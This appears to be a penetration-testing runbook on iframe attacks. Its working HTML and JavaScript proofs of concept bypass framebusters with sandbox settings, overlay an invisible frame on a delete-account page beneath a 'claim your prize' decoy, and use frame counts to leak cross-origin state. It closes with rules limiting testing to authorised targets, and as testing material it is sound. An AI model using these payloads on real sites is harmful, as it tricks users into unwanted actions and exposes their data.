---
title: "Iframe Traps"
description: "Bypassing framebusters, escaping sandboxes, and using iframes for clickjacking variants and frame-counting oracles."
phase: Web
order: 82
tags:
  - iframe
  - clickjacking
  - sandbox
  - client-side
tools:
  - browser devtools
  - burp suite
updated: 2026-10-01
---

Iframes let one page embed another, and the embedded page's attempts to defend itself can often be defeated. This runbook checks whether framing is possible, defeats framebusters, inspects sandbox tokens, applies clickjacking overlays, and evaluates frame-count oracles — on **in-scope** targets only.

## 1. Check whether framing is possible

Framing is blocked by `X-Frame-Options` or a CSP `frame-ancestors` directive.

```bash
for u in https://target.com https://target.com/login https://target.com/settings; do
  echo "== $u"
  curl -s -I "$u" | grep -iE "^x-frame-options|^content-security-policy"
done
```

If neither header is present, the page is frameable. If `X-Frame-Options: DENY` is set but CSP is absent (or vice versa), note the mismatch.

## 2. Build a baseline framing PoC

```html
<!-- frame.html -->
<iframe src="https://target.com/login" width="900" height="600"
        sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
```

## 3. Bypass framebusters

Sites break out with `if (top != self) top.location = self.location;`. Sandbox the frame **without** `allow-top-navigation` to neuter the escape.

```html
<!-- bust.html: allow-scripts runs the app; no allow-top-navigation blocks the bust -->
<iframe src="https://target.com/settings"
        sandbox="allow-forms allow-scripts" width="1000" height="700"></iframe>
<script>
  window.onbeforeunload = function () { return "stay"; }; // stall a redirect bust
</script>
```

Add `allow-same-origin` if the app needs storage; `allow-scripts` + `allow-same-origin` together let a same-origin frame remove its own sandbox.

## 4. Test sandbox token behavior

Determine what each token actually permits rather than assuming.

```html
<!-- sandbox-test.html -->
<h3>allow-forms only: no scripts, no top nav</h3>
<iframe src="https://target.com/settings" sandbox="allow-forms" width="900" height="300"></iframe>
<h3>allow-scripts + allow-same-origin: potential sandbox removal</h3>
<iframe src="https://target.com/settings" sandbox="allow-scripts allow-same-origin" width="900" height="300"></iframe>
<h3>allow-top-navigation: frame can redirect the whole page</h3>
<iframe src="https://target.com/settings" sandbox="allow-scripts allow-top-navigation" width="900" height="300"></iframe>
```

## 5. Clickjacking overlay and frame oracle

With framing possible, overlay decoy controls; also test whether frame count leaks state.

```html
<!-- clickjack.html: invisible target frame under a decoy button -->
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%;
           opacity:0.0001; z-index:2; border:0; }
  .decoy { position:absolute; top:200px; left:300px; z-index:1; font:24px sans-serif; }
</style>
<div class="decoy">Click to claim your prize</div>
<iframe src="https://target.com/settings/delete-account"
        sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
```

```html
<!-- oracle.html: frame count may reveal a boolean -->
<script>
  var f = document.createElement("iframe");
  f.src = "https://target.com/search?q=secret";
  f.onload = function () {
    try { console.log("frames:", f.contentWindow.length); }
    catch (e) { console.log("blocked:", e.name); }
  };
  document.body.appendChild(f);
</script>
```

## Full pipeline

```bash
T="https://target.com"

# 1. Enumerate framing defenses across key pages
for u in "$T" "$T/login" "$T/settings"; do
  echo "== $u"; curl -s -I "$u" | grep -iE "^x-frame-options|^content-security-policy"
done
# 2. Serve the surviving PoCs and inspect in a browser
python3 -m http.server 8000
# 3. Re-check headers after any WAF/CDN variation
curl -s -I "$T/settings" | grep -iE "^x-frame-options|^content-security-policy|^server"
```

Open `frame.html`, then `bust.html`, then `clickjack.html`, then `oracle.html`.

## Ethics & legality

- Only frame and clickjack in-scope properties; overlay PoCs must not perform real state-changing actions.
- Use your own accounts and remove or disable any destructive target button in the PoC.
- Never deploy a clickjacking page to real users; keep it local and evidence-only.
- Report the missing `frame-ancestors`/`X-Frame-Options` as the root cause.
